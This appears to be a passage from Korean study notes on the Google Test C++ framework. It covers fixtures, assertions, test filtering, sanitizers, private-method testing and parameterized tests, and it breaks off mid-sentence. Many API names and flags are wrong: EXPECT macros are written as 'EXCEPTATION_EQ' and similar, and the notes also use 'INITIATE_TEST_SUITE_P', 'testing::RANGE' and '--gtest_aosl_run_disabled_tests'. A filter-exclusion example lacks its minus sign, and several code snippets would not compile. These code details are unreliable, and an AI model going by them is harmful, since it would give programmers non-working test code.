된다. g++ -c ./googletest/googletest/src/gtest_main.cc -I ./googletest/googletest/include/ -std=c++14 -O2 명령으로 gtest_main.o 를 생성한다. ar rcv libgtest.a gtest-all.o gtest_main.o 명령으로 test.a 라이브러리에 gtest_main 을 포함시킨다. 이후에는 main 함수를 따로 작성하지 않아도 라이브러리만 추가하여 빌드하면 main 함수를 직접 작성 한 것과 동일하게 동작한다. main 함수는 직접 정의해서 사용 하는것을 권장한다.\nmain 함수는 두 개 이상 선언할 경우에는 컴파일러에 따라 링크 오류가 발생하거나 원하지 않는 main 함수가 실행될 수도 있다.\ng++ main.cpp -I ./googletest/googletest/include/ -lgtest -L. -std=c++14 -pthread\n소스코드와 함께 라이브러리를 연동하여 실행 파일 빌드 기본 사용법 gtest/gtest.h 헤더 하나만 include 하면 g-test의 모든 기능 사용 가능 Test Case 작성 TEST(Test_Suite_Name, Test_Case_Name) 형태의 매크로를 사용하여 TC 생성 가능\nTEST(SampleTestCase, SampleTest) { FAIL() \u0026lt;\u0026lt; \u0026#34; 실패\u0026#34;; // 실패처리 이후 화면에 \u0026#34;실패\u0026#34; 문자열 출력 } FAIL() 매크로가 호출되지 않는 Test Case는 성공으로 처리된다.\nSUCCEED() 라는 매크로가 있지만, 이는 가독성을 위한 것일 뿐, 아무것도 하지 않는 매크로이다. 3A 에 기반하여 test case 를 구성한다.\nArrange (Given) : 테스트 대상 코드를 초기화하고 필요한 경우 설정하고 준비 객체 선언, 초기화 등 Act (When) : 테스트 대상 코드에서 동작을 수행 동작 수행 Assert (Then) : 기대하는 바와 실제 결과를 비교 ASSERT 매크로 활용 ASSERT_EQ(a, b) : a ==b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_NE(a, b) : a != b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_LT(a, b) : a \u0026lt; b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_LE(a, b) : a \u0026lt;= b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_GT(a, b) : a \u0026gt; b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_GE(a, b) : a \u0026gt;= b 라면 SUCCEED(), 아니면 FAIL() 호출 ex) `ASSERT_EQ(a, b) \u0026laquo; \u0026ldquo;a == b 를 만족하지 못합니다\u0026rdquo; Test Suite Class testing::Test Class 를 상속받는 Class이다.\nex) class TestSuiteName : public testing::Test 신선한 Fixture 전략\ntest case 간 동작의 독립성을 보장하기 위해 test case 가 하나 수행되면 새로운 fixture 객체를 생성하고 소멸하는 방식 \u0026ldquo;느린 테스트 문제\u0026quot;가 발생하여 개발자의 생산성을 떨어뜨리고, 개발자가 regression test를 수행하지 않게 될 수 있다. 공유 fixture 전략\nfixture 설치/해체에 소요되는 시간을 절감하여 테스트 속도를 증가시키기 위해 모든 test case 가 공유된 fixture를 사용하는 방식 \u0026ldquo;변덕스런 테스트 문제\u0026quot;가 발생 할 수 있다. 대부분의 xUnit framework 는 \u0026lsquo;신선한 fixture 전략\u0026rsquo; 을 사용하지만, test framework 마다 차이가 있을 수 있으므로, test case 의 독립성을 유지시키기 위해서는 framework 에 따라 다른 전략이 필요하다.\ntest suite 에 대응되는 class 이므로, 용도도 test suite 에 맞게 동일한 fixture 를 사용하는 test ase 들을 관리할 수 있는 class 로 활용하면 되겠다.\nTest Case Class TEST 혹은 TEST_F 매크로를 사용하면 자동으로 생성된다. TEST 매크로 : 암묵적으로 test suite class 를 생성하고 test case class 를 생성하는 매크로 TEST_F 매크로 : 명시적으로 생성된 test suite class 를 참조하여 test case class 를 생성하는 매크로 \u0026lsquo;F\u0026rsquo; 는 fixture 의 약자 Test Suite Class 를 상속받아 생성된다. ex) TEST(TestSuiteName, TestCaseName) -\u0026gt; class TestSuiteName_TestCaseName_test : public TestSuiteName Test Fixture xUnit Test Framework 에서 SUT 를 실행하기 위해 준비해야 하는 사전 작업(사전 조건)\nArrange 단계가 fixture setup 를 수행하는 단계이다.\nTest Fixture 를 구성(setup)하는 방식은 두 가지가 있고, 각각 장단이 있다.\nInline Fixture Setup\n모든 fixture setup을 test case 안에서 수행 장점 : 인과관계 분석이 쉽다. 단점 : 테스트 코드의 중복이 발생한다. test smell (테스트의 가독성, 유지보수성, 신뢰성을 떨어뜨리는 요소) 에 해당한다. Delegate Setup\nfixture setup 단계를 test utility 함수를 통해 캡슐화 한다.\nTEST() 매크로를 호출하는 것은, testing::Test class 를 상속하여 class 를 생성하고, 그 생성된 class를 호출하는 형태이다. 이러한 형태를 암묵적인 방법으로 test suite class 를 선언하는 형태라 한다.\ntest suite class 를 명시적으로 선언한다면, delegate setup 기법을 사용할 수 있다.\n// 명시적인 test suite class 선언 class TestSuiteName : public testing::Test { public: // 자식 class 에서 접근할 수 있어야 하기 때문에 public 혹은 protected 설정 가능 class target = new TargetClass() // 공통된 fixture setting 동작 수행(변수 선언) // 여기서 선언된 변수를 TEST_F 에서 참조하여 사용 }; TEST_F(TestSuiteName, TestCaseName) { target.do_something(); // TestSuiteName class 의 \u0026#39;target\u0026#39; 변수 사용 가능 } // TEST() 매크로 대신 TEST_F() 매크로 사용하여 test case class 선언 // c++ 내부적으로 class TestSuiteName_TestCaseName_test : public TestSuiteName 형태의 class 가 선언 된다. 명시적으로 test suite class 를 선언하고, TEST() 대신 TEST_F() 매크로로 test case class 를 선언한다. 장점 : 테스트 코드의 중복을 제거하고, redundant 한 테스트 준비 과정을 test case 안에서 제거 할 수 있다.\n단점 : 인과관계 분석이 어렵다\nImplicit Setup\nxUnit test framework 이 제공하는 방법 Delegate Setup 과 마찬가지로 명시적인 test suit class 작성이 필요 test suit class 에서 SetUp() 함수를 정의 해 놓으면, test case 가 실행 될 때 SetUp() 함수가 호출된다. (암묵적 수행) // 명시적인 test suite class 선언 class TestSuiteName : public testing::Test { protected: void SetUp() override { class target = new TargetClass() // 공통된 fixture setting 동작 수행(변수 선언) } void TearDown() override { delete target } }; TEST_F(TestSuiteName, TestCaseName) { target.do_something(); // TestSuiteName class 의 \u0026#39;target\u0026#39; 변수 사용 가능 } 장점 : 테스트 코드의 중복을 제거하고, redundant 한 테스트 준비 과정을 test case 안에서 제거 할 수 있다. 단점 : 인과관계 분석이 어렵다 Delegated Setup 혹은 Implicit Setup 을 사용할 때 메모리 누수에 대해 주의할 필요가 있다.\nASSERT 구문은, 실패로 판단되는 경우 이후 동작은 수행하지 않는다. 만약 ASSERT 구문에 의해 실패가 발생하면 이후 객체의 소멸자가 호출하지 않게 된다. Implicit Setup 을 사용 할 경우에는 테스트가 시작되기 전 SetUP() 함수가 호출되고, 테스트가 완료 되면 TearDown() 함수가 호출된다.\nSetUp() 에서 fixture setup을 완료 해 주고, TearDown() 에서 사용한 리소스를 정리하면 되겠다. Global Fixture testing::Environment 를 상속받은 class 로 전역 fixture 를 설정 할 수 있다.\nex) class MyEnvironment : public testing::Environment Environment class 에는 Test class 와 마찬가지로 Setup, TearDown 이 제공된다.\nmain 함수 안에 testing::AddGlobalTestEnvironment(new MY_OBJECT); 구문을 추가 해 주면, 모든 test 수행 직전에 Environment의 SetUp() 함수가 동작하고, 모든 test case 들이 수행된 이후 Environment의 TearDown() 함수가 실행된다.\nex) testing::AddGlobalTestEnvironment(new MyEnvironment) // 인자로 들어갈 객체를 new 를 통해 생성해야 함에 주의. 완료 후 자동으로 해제됨 main 함수를 직접 구현하지 않은 경우에는 아래 구문으로도 적용 가능하다.\ntesting::Environment* myEnvironment = testing::AddGlobalTestingEnvironment(new MyEnvironment); 전역 변수는 main 함수가 실행되기 전에 설정된다는 점을 이용한 방식 하지만, 가독성을 떨어뜨리고 아래 문제를 발생시킬 수 있기 때문에 공식적으로는 권장하지 않는 방식이다. 둘 이상의 environment를 선언하면 environment 의 설정과 해체 순서가 중요하다. 먼저 설정된 environment 가 가장 나중에 해제되어야 한다.(LIFO) 하지만 C++ 에서는 둘 이상의 파일에 선언된 전역변수의 초기화 순서가 명확히 정의되어있지 않다. 여러 파일에서 포인터를 활용하여 environment를 선언하면 environment 의 설정과 해체 순서가 보장되지 않아 위험하다. main 함수를 직접 구현하여 environment를 설정하면 environment 의 해체 순서가 명확히 정의 되어 안전하다. 느린 테스트 문제 \u0026ldquo;신선한 fixture 전략\u0026rdquo; 을 사용하는 경우, SetUp 과 TearDown 에 시간이 많이 소요된다면 TestCase 가 많아질 수록 test 에 소요되는 시간이 늘어나 생산성이 떨어진다. 테스트가 느리면 code 가 변경되어도 테스트를 수행하지 않게 될 수도 있다. 이러한 문제를 해결하기 위해, xUnit Framework 에서는 수동으로 호출 할 수 있는 fixture 설치/해제 동작을 제공한다. 아래와 같이 함수를 대체하면 test case 마다 SetUp / Teardown 을 수행하지 않고, SetUp은 최초 한 번, TearDown은 최후 한번만 수행한다. void SetUp() -\u0026gt; static void SetUpTestSuite()\nvoid TearDown() -\u0026gt; static void TearDownTestSuite()\nex)\n// AS IS SetUp() TC1() TearDown() SetUp() TC2() TearDown() SetUp() TC3() TearDown() // TO BE SetUpTestSuite() TC1() TC2() TC3() TearDownTestSuite() static 함수를 사용하기 때문에 class 멤버 변수도 static 으로 변경하여 선언이 필요하다.\n여러 test case 가 하나의 fixture 객체를 공유하기 때문에, fixture 관리가 제대로 되지 못한다면 \u0026ldquo;변덕스런 테스트 문제\u0026quot;가 발생할 수 있다. 즉, 신뢰성이 떨어질 수 있다. C++ 에서는 생성자와 소멸자와 유사하고 대체 가능하지만, 특정 언어에서는 소멸자 개념이 없기 떄문에 xUnit Framework 관점에서는 생성자 소멸자 대신 SetUpTestSuite, TearDownTestSuite 를 사용하는 것이 바람직하다. 변덕스런 테스트 문제 test case 의 수행 횟수, 순서 등에 따라 test case 의 결과가 달라지는 현상 어떤 test case 에 의해 다음 test case 의 test fixture 가 영향을 받아 발생 ASSERTION / EXCEPTATION ASSERTION\nASSERTION 종류는 다음같다.\nASSERT_EQ(a, b) : a ==b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_NE(a, b) : a != b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_LT(a, b) : a \u0026lt; b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_LE(a, b) : a \u0026lt;= b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_GT(a, b) : a \u0026gt; b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_GE(a, b) : a \u0026gt;= b 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_TRUE(a) : a == true 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERT_FALSE(a) : a == false 라면 SUCCEED(), 아니면 FAIL() 호출 ASSERTION 은 FAIL로 판별되면 다음 동작은 수행하지 않는다. 이러한 ASSERTION 의 특징상 하나의 test case 안에서 여러 ASSERTION 을 사용하면 한 번의 검증으로 모든 ASSERTION 을 검증할 수 없다.\n\u0026ldquo;죽은 단원문의 문제\u0026rdquo; 발생 xUnit Framework 에서는 하나의 test case 에 하나의 ASSERTION 만 사용하도록 권장 하지만, ASSERTION 을 분리하면 관리해야 하는 test case 가 늘어나고, test code 중복의 문제가 발생한다. 이를 대체하기 위해 EXPECT 구문이 존재한다. 특정 구문이 FAIL 일 때, 이후 코드를 동작시킬 때 segmentation fault 가 발생한다면 ASSERTION 을 사용하는 것이 좋다.\n테스트 프로그램이 안전하게 동작 할 수 있는 보호 역할을 수행한다. EXCEPTATION\ngoogle framework 에서 제공하는 기능으로, 지원하지 않는 test framework 들도 있다.\nASSERTION과 유사하지만, FAIL 판정이 되더라도 이후의 코드도 끝까지 수행한다.\nASSERTION 대신 EXCEPTATION 을 사용하면 \u0026ldquo;죽은 단원문의 문제\u0026rdquo; 를 해결할 수 있다.\nEXCEPTATION 종류는 다음과 같다.\nEXCEPTATION_EQ(a, b) : a ==b 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_NE(a, b) : a != b 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_LT(a, b) : a \u0026lt; b 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_LE(a, b) : a \u0026lt;= b 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_GT(a, b) : a \u0026gt; b 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_GE(a, b) : a \u0026gt;= b 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_TRUE(a) : a == true 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_FALSE(a) : a == false 라면 SUCCEED(), 아니면 FAIL() 호출 segmentation fault 등으로 인해 테스트 프로그램이 비정상 종료 될 수 있는 경우 EXCEPTION 보다는 ASSERTION 을 사용하는 것이 권장된다.\nC 문자열을 비교\nEXCEPTATION_STREQ(a, b) : 문자열a == b 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_STRNE(a, b) : 문자열a != b 라면 SUCCEED(), 아니면 FAIL() 호출 EXCEPTATION_STRCASEEQ(a, b) : 대소문자 상관없이 문자열a == b 라면 SUCCEED(), 아니면 FAIL() 호출 부동소수점 비교\n부동 소수점을 일반 판정문으로 비교를 하면 메모리에 표시되는 형태를 바로 비교하기 때문에 원하는 결과가 나오지 않을 수 있다. ex) EXPECT_EQ(0.7, 0.1 * 7) -\u0026gt; FAIL() 부동 소수점의 오차 범위(라이브러리에 정의된) 안에 들어오는지 판단하는 로직이 추가로 존재한다. EXPECT_DOUBLE_EQ(a, b): 부동소수점 a == b 라면 SUCCEED(), 아니면 FAIL() 호출 EXPECT_NEAR(a, b, c): |a-b| \u0026lt;= C 라면 SUCCEED(), 아니면 FAIL() 호출 (오차 허용 범위) 라이브러리에 정의된 오차 범위 말고 직접 오차 범위를 설정하여 판별하는 방법 Error case 비교\ntry-catch 구문에서 catch 로 처리된 구문과 의도하지 않은 error 를 구분하여 검증 할 수 있다. EXPECT_THROW(FUNCTION_TO_RUN, ERROR) : FUNCTION_TO_RUN 에서 예외를 throw 한다면 SUCCEED(), 아니면 FAIL() 호출 ex) EXPECT_THROW(do_something(arg), std::invalid_argument)\u0026laquo; \u0026ldquo;의도하지 않은 인자\u0026rdquo; EXPECT_ANY_THROW(FUNCTION_TO_RUN) : FUNCTION_TO_RUN 에서 예외를 throw 한다면 SUCCEED(), 아니면 FAIL() 호출 EXPECT_NO_THROW(FUNCTION_TO_RUN) : FUNCTION_TO_RUN 에서 예외를 throw 한다면 FAIL(), 아니면 SUCCEED() 호출 Disabled Test Case test case 의 결과는 FAIL 과 SUCCESS 외 \u0026ldquo;유지 보수가 필요한 상태\u0026rdquo; 가 하나 더 존재한다.\n유지 보수가 필요한 test case 를 주석처리 하면 test case 존재 자체가 잊혀질 수 있다(\u0026ldquo;잊혀진 테스트 문제\u0026rdquo;) 유지 보수가 필요한 test case 를 fail 처리하면 false alarm 이 발생한다. 유지 보수가 필요한 test case 를 true 처리 하면 정상 TC로 판단되어 유지보수가 필요하다는 것이 드러나지 않을 수 있다. 유지보수가 필요한 경우, test 를 비활성화 하여 결과에 포함되지 않지만 비활성화 테스트를 따로 표기 되도록 하려면, test case 의 이름 앞에 prefix 로 DISABLED_ 를 붙이면 된다.\nex) TEST(MyTestSuite, DISABLED_MyTestCase) 테스트 실행 결과에 YOU HAVE # DISABLED TEST 문구가 표시된다. test suite 이름에 DISABLED_ 를 붙여도 test case 를 비활성화 시킬 수 있다.\nex) TEST(DISABLED_MyTestSuite, MyTestCase) 테스트 실행시 --gtest_aosl_run_disabled_tests 옵션을 추가하면 disabled 된 테스트도 실행 할 수 있다.\nex) ./a.out --gtest_aosl_run_disabled_tests Test Filter 원하는 테스트를 선택적으로 실행 할 수 있도록 하는 기능 테스트 실행시 test case 의 이름으로 필터를 걸 수 있다. --gtest_filter=TEST_SUITE_NAME.TEST_CASE_NAME 옵션을 추가한다. ex) ./a.out --gtest_filter=myTestSuite.MyTestCase ex) ./a.out --gtest_filter=myTestSuite.MyTestCase:myTestSuite2.MyTestCase2 // 복수의 조건 설정 wild card 를 지원한다. ex) ./a.out --gtest_filter=my*.* 특정 항목을 제외하는 조건을 설정 가능하다. ex) ./a.out --gtest_filter=my*.*:*.foo Test 신뢰성 점검 테스트는 수행 횟수와 순서에 상관없이 동일한 결과가 나와야 한다. 테스트의 신뢰성을 점검하기 위해 테스트 실행시 설정 가능한 옵션이 존재한다. --gtest_shuffle : 테스트 순서를 무작위로 섞어준다. --gtest_repeat=REPEAT_NO : REPEAT_NO 횟수만큼 테스트 반복 실행 몇 번째 테스트에서 실패 했는지 확인하기 어렵다. --gtest_break_on_failure : 테스트 실패시 강제적으로 프로그램을 종료하는 옵션. 특히 반복 테스트 시에 유용하다. Test 산출물 테스트 실행시 옵션을 추가하여 test 결과를 원하는 형태로 export 가능하다. --gtest_output=xml: test_detail.xml 파일에 test 결과를 xml 형태로 저장 --gtest_output=xml:OUTPUT_NAME.xml: 출력 결과물 이름 OUTPUT_NAME.xml 로 설정 --gtest_output=json : test_detail.json 파일에 test 결과를 json 형태로 저장 google test framework 고유의 기능으로 1.10 버전 이후부터에 지원 xUnit Test Framework 정립 이전(google test framework 1.10버전 이전)에는 용어가 상이할 수 있다. 비 기능적인 부분도 산출물에 출력되도록 설정 가능하다.. 코드에 RecordProperty(KEY, VALUE) 항목을 추가하여 산출물에 사용자가 정의한 key, value 를 추가할 수 있다. 비기능 테스트 시간, 메모리 등 성능에 대한 검증이 필요할 때, 가독성을 높이며 로직 추가를 최소화 하여야 한다. 시간 측정\n매크로를 활용한 사용자 정의 단언문으로 가독성 문제를 해결 가능하다. #define EXPECT_TIMIEOUT(fn, t) \\ do { \\ time_t timeout = t; // 테스트 결과에 변수명이 찍히므로, 변수명도 유의미하게 선언 \\ time_t start = time(nullptr); \\ fn; \\ time_t duration = time(nullptr) - start; \\ EXPECT_LE(duration, timeout) \u0026lt;\u0026lt; \u0026#34;Timeout \u0026#34; \u0026lt;\u0026lt; duration \u0026lt;\u0026lt; \u0026#34;/\u0026#34; \u0026lt;\u0026lt; timeout; \\ } while (0) 메모리 측정\noperation new, operation delete 을 재정의\n메모리 할당 횟수를 전역변수로 관리하여 new 와 delete 의 횟수가 일치하는지 점검\nGTEST_LEAK_TEST define 을 추가하여 메모리 검증 테스트 코드는 컴파일시 선택적으로 적용 가능하도록 구현\n컴파일 옵션에 -DGTEST_LEAK_TEST 추가하여 코드 적용 가능 static int cnt class SUT { public: // 테스트 할 함수 void do_something() { ; } # ifdef GTEST_LEAK_TEST // 재정의 void* operator new(size_t size) { ++allocCount; return malloc(size); } // 재정의 void operator delete(void* p, size_t) { free(p); --allocCount; } #endif }; # ifdef GTEST_LEAK_TEST int SUT::cnt = 0; // 전역변수 # endif TEST(TS,TC) { int alloc = SUT::cnt; EXPECT_TRUE(SUT::do_something()); int diff = SUT::cnt - alloc; EXPECT_EQ(diff, 0) \u0026lt;\u0026lt; diff \u0026lt;\u0026lt; \u0026#34;memory leacked!\u0026#34;; } 명시적으로 class 를 만들고 SetUp 과 TearDown 활용 할 수도 있다.\nclass SUTTest : public testing::Test { protected: void SetUp() override { # ifdef GTEST_LEAK_TEST alloc = SUT::cnt; #endif } void TearDown() override { # ifdef GTEST_LEAK_TEST int diff = SUT::cnt - alloc; EXPECT_EQ(diff, 0) \u0026lt;\u0026lt; diff \u0026lt;\u0026lt; \u0026#34;memory leacked!\u0026#34;; #endif } } TEST(TS,TC) { EXPECT_TRUE(SUT::do_something()); } 단점\n제품 코드에 테스트용 코드가 추가된다. test code 가 특정 제품 코드에 국한되고, 재사용이 어렵다. SetUp 과 TearDown 이 fixture 외 용도로 사용된다. Sanitizer 사용\nSanitizer : 메모리, 속도, 미정의 동작을 체크 할 수 있는 컴파일러가 제공하는 도구 다만, 모든 플랫폼에서 제공되지는 않는다. (리눅스 플랫폼에서는 지원 됨) 컴파일 옵션에 -fsanitize=address 를 추가하면 설정 가능하다. google test framework 결과와 별개로 실행 결과 출력에서 memory leak 이 발생한 크기 및 위치 정보가 출력된다. C++ 에서는 1번 방법보다 Sanitizer 를 사용하는 것이 더 효과적이다. 컴파일러 sanitize 옵션 -fsanitize=address : 메모리 릭 감지 -fsanitize=thread : 데드락 감지 -fsanitize=undefined : 미정의 동작 감지 Private 영역 검증 private 영역에 존재하는 함수는 test code 클래스에서 호출할 수 없어 검증이 불가능하다. (xUnit Test framework 표준에는 방법이 없음) xUnit Test pattern 에서는, 테스트가 필요한 method 는 private 영역에 두지 않아야 한다고 권장한다. \u0026ldquo;검증되지 않은 private method 는 검증된 public method 보다 위험하다\u0026rdquo; private method 는 public method 의 가독성을 높이는 목적으로 사용되어야 한다. private method 는 public method 에서 호출되는 형태로 구성 private: A(); B(); public: C() { A(); B(); } Google Test Framework 는 FRIEND_TEST 기능을 제공하여 test case 에서 private 함수에 접근이 가능하게 할 수 있다. class SUT { void process1() { } void process2() { } public: void foo() { } void goo() { process1(); process2(); } FRIEND_TEST(TS, TC); // \u0026#39;TS\u0026#39; test suite 의 \u0026#39;TC\u0026#39; test case 이름을 가진 test case 에서 private 영역에 참조 가능 }; TEST(TS, TC) { SUT sut; sut.goo(); sut.process1(); // 에러 발생하지 않음 } 단점 : 제품코드에 google test framework 의존성이 생기게 된다. #include \u0026lt;gtest/gtest_prod.h\u0026gt; 를 추가하면 FRIEND_TEST 를 사용할 수 있다. 장점 : 은닉 정책을 변경하지 않고 테스트를 수행 할 수 있다. 테스트 전용 하위 class 테스트가 필요한 함수가 protected 영역에 존재한다면, test code 영역에서 SUT class 를 상속받는 하위 class 를 만들어서 테스트 되지 않은 요구사항을 검증할 수 있다. class SUT { protected: void foo() { } }; class TestSUT : public SUT { // SUT 를 상속한 test class public: using SUT::foo(); // parent 의 foo 함수를 public 영역에서 재선언. 아래 주석과 동일한 역할 /* void foo() { return foo(); // SUT 의 foo 함수를 호출 } */ } TEST(TS, TC) { TestSUT sut; sut.foo(); // 호출 가능 } 장점 : 제품 code를 변경하지 않고 요구사항을 검증 할 수 있다. 제품 코드에서 검증을 위해 확인 할 수 있는 요소가 없고, 테스트 할 함수가 가상함수로 구현된 경우 ex)\nclass SUT1 { virtual ~SUT() {} virtual void foo() { } // 가상함수 }; class SUT2 { SUT1* sut; SUT2 (SUT1* sut) : sut { sut }; // 생성자, 초기화 void goo() { sut-\u0026gt;foo(); } }; goo 호출시 foo 가 호출됨을 확인하고싶지만, SUT1 객체에 foo 호출 여부를 알 수 있는 변수가 없다. 테스트 class 를 추가한다. class TestSUT1 : public SUT1 { public: bool flag = false; // foo 가 호출되었는지 여부를 표시하는 변수 추가 void foo() override { SUT1::foo(); flag = true; } }; TEST(TS, TC) { TestSUT1 sut1; SUT2 sut2 {\u0026amp;sut1}; sut2.goo(); // foo 가 가상함수이기 때문에 goo 에서 TestSUT1.foo 를 호출 EXPECT_TRUE(sut1.flag); // foo 가 호출되었는지 여부를 확인 가능 } 제품 코드를 수정하여 test code 작성 리소스를 줄이는 것이 가장 이상적이다.\n단위 테스트 작성 비용이 최소화 되어야 하고, 테스트하기 쉬워야 한다는 관점에서 볼 때 제품 코드 수정 없이 문제를 해결하려면, 생성자/소멸자 가상함수를 hooking 하여 테스트를 위한 코드를 작성 할 수 있다.\n위 방법은 foo 가 가상함수이기 때문에 가능한 방법이다.\n멤버 함수는 객체의 type 을 보고 수행되기 때문에 parent 의 함수가 수행됨 가상함수는 참조 변수의 함수를 바로 호출하기 때문에 child 의 함수가 수행됨 위 경우를 보면 일반 함수보다 가상 함수가 테스트 하기 편하다는 장점을 확인 할 수 있다.\n파라미터화 테스트 (Parameterized Test) test code 의 중복을 제거하기 위해 test code 에 for 문을 사용한 loop 를 추가하면 문제가 발생한다.\n테스트 코드에 제어구문이 들어가게 된다. 에러 발생시 테스트 결과 산출물에 에러를 발생시킨 인자가 정확하게 표시되지 않을 수 있다. xUnit Test Framework 은 입력 데이터를 바꿔가며 반복 검사하는 데이터 중심의 테스트에서 테스트 코드 중복의 문제를 해결할 수 있는 기능을 제공\n사용 방법\nTestWithParam 을 상속받는 명시적인 test suite class 선언\nex) class stringTestSuite : public testing::TestWithParam\u0026lt;std::string\u0026gt; { }; INSTANTIATE_TEST_SUITE_P 매크로를 활용하여 data set 정의\nINSTANTIATE_TEST_SUITE_P(prefix, test_suite_class, data_set) prefix : 어떤 특성을 갖고있는지 표현하는 용도, string 형태 아니고 코드 형태로 원하는 문자 입력하면 됨 test_suite_class : data set 을 사용할 test suite class 이름 data_set : testing::Values() 함수로 표현된 데이터 셋 ex) INSTANTIATE_TEST_SUITE_P(Prefix, TS, testing::Values( \u0026#34;AAA\u0026#34;, \u0026#34;BBB\u0026#34;, \u0026#34;CCC\u0026#34; ) ); data set 을 이용하는 test case 를 정의한다.\nTEST_P 매크로를 사용하여 test case 를 정의한다. GetParam() 함수를 사용하면 이전에 정의한 data set 을 하나씩 불러온다. 정의된 data set 갯수만큼 TEST_P 로 정의한 함수를 호출한다. ex) TEST_P(TS, TC) { const std::string str = GetParam(); // 정의된 data set 을 불러옴 EXPECT_TRUE(foo(str)); // foo(str) 결과가 참인지 평가 } for 문을 사용 했을 때와 다르게 test 결과 산출물에 어떤 데이터에서 실패가 발생 했는지 명확히 표시된다. 테스트 결과 예시 [==========] Running 12 tests from 1 test suite. [----------] Global test environment set-up. [----------] 12 tests from prefix/test_suite_class [ RUN ] prefix/test_suite_class.test_case/0 [ OK ] prefix/test_suite_class.test_case/0 (0 ms) [ RUN ] prefix/test_suite_class.test_case/1 [ OK ] prefix/test_suite_class.test_case/1 (0 ms) [ RUN ] prefix/test_suite_class.test_case/2 [ OK ] prefix/test_suite_class.test_case/2 (0 ms) [ RUN ] prefix/test_suite_class.test_case/3 [ OK ] prefix/test_suite_class.test_case/3 (0 ms) [ RUN ] prefix/test_suite_class.test_case/4 [ OK ] prefix/test_suite_class.test_case/4 (0 ms) [ RUN ] prefix/test_suite_class.test_case/5 [ OK ] prefix/test_suite_class.test_case/5 (0 ms) [ RUN ] prefix/test_suite_class.test_case/6 [ OK ] prefix/test_suite_class.test_case/6 (0 ms) [ RUN ] prefix/test_suite_class.test_case/7 [ OK ] prefix/test_suite_class.test_case/7 (0 ms) [ RUN ] prefix/test_suite_class.test_case/8 [ OK ] prefix/test_suite_class.test_case/8 (0 ms) [ RUN ] prefix/test_suite_class.test_case/9 [ OK ] prefix/test_suite_class.test_case/9 (0 ms) [ RUN ] prefix/test_suite_class.test_case/10 test11.cpp:31: Failure Value of: IsPrime(num) Actual: false Expected: true [ FAILED ] prefix/test_suite_class.test_case/10, where GetParam() = 4 (0 ms) [ RUN ] prefix/test_suite_class.test_case/11 test11.cpp:31: Failure Value of: IsPrime(num) Actual: false Expected: true TEST_P 로 정의된 test case 들은 파라미터만 다르게 설정하여 TEST_F 를 여러 개 만든 것과 동일하다.\n파라미터를 순회하며 수행되는 test case 들 사이에도 SetUp, TearDown 함수가 호출된다. 사용자 정의 type을 사용할 수도 있다.\nstruct InputType { int A; int B; } // test 결과 산출물에서 사용자 정의 type(struct)이 가독성 있는 형태로 출력하기 위한 연산자 재정의 std::ostream\u0026amp; operator\u0026lt;\u0026lt;(std::ostream\u0026amp; os, const InputTypes\u0026amp; data) { return os \u0026lt;\u0026lt; \u0026#34;(\u0026#34; \u0026lt;\u0026lt; data.A \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; data.B \u0026lt;\u0026lt; \u0026#34;)\u0026#34;; // C++ 20 부터 지원하는 형태 #include \u0026lt;format\u0026gt; // return os \u0026lt;\u0026lt; std::format(\u0026#34;({},{})\u0026#34;, data.A, data.B); } INITIATE_TEST_SUITE_P(prefix, TS, testing::Values( (1,1) (2,2) (3,3) )); TEST_P(TS, TC1) { const InputType\u0026amp; data = GetParam(); EXPECT_TRUE(foo(data.A)); } TEST_P(TS, TC2) { const InputType\u0026amp; data = GetParam(); EXPECT_TRUE(foo(data.B)); } 사용자 정의 타입을 사용 할 때는 연산자 재정의를 해 줘야 테스트 결과 산출물에 원하는 형태로 출력이 가능하다. 둘 이상의 파라미터를 조합하여 사용하는 경우 testing::Combine 과 testing::ValuesIn 을 사용할 수 있다.\ntesting::Combine : 주어진 파라미터 (A,B,C\u0026hellip;)으로 구성할 수 있는 모든 조합에 대해 data set 을 구성한다. testing::ValuesIn : 배열을 파라미터로 받아 data set 으로 구성한다. // SUT 에서 정의된 타입 enum Color {BLACK, WHITE, RED, ORANGE, BLUE} // 테스트에 사용될 데이터 Color colors[] = {Color::BLACK, Color::WHITE}; std::vector\u0026lt;std::string\u0026gt; str = {\u0026#34;black\u0026#34;, \u0026#34;white\u0026#34;}; // 튜플 형태 정의 using InputType = std::tueple\u0026lt;std::string, Color, int\u0026gt; // data set 구성 INITIATE_TEST_SUITE_P(prefix, TS, testing::Combine( testing::ValuesIn(colors), testing::ValuesIn(str), testing::Values(1, 2, 3) // Values 를 섞어 구성할 수도 있다. ) ); TEST_P(TS, TC) { const InputType\u0026amp; data = GetParam(); // 설정한 데이터 사용 Color color = std::get\u0026lt;0\u0026gt;(data); std::string str = std::get\u0026lt;1\u0026gt;(data); int num = std::get\u0026lt;2\u0026gt;(data); } 한 Test Suite 에 대해 파라미터(INITIATE_TEST_SUITE_P) 를 여러 개 정의하면, 각 파라미터를 독립되게 이어서 진행한다.\n기타 파라미터 생성 함수\ntesting::RANGE() : 지정된 범위에 해당하는 숫자로 배열 구성 testing::RANGE(1,100) : 1~99까지의 수로 구성된 배열 생성 [1, 2, 3, .. , 99] testing::RANGE(1,100,2) : 1~99까지 2씩 증가하는 수로 구성된 배열 생성 [1, 3, 5, .. , 99] Test Listener 테스트 과정에서 발생하는 이벤트 들에 대해 특정 작업을 수행해야 할 때, Listener 를 등록하여 처리할 수 있다.\nGoogle Test Framework 의 고유 기능으로, xUnit 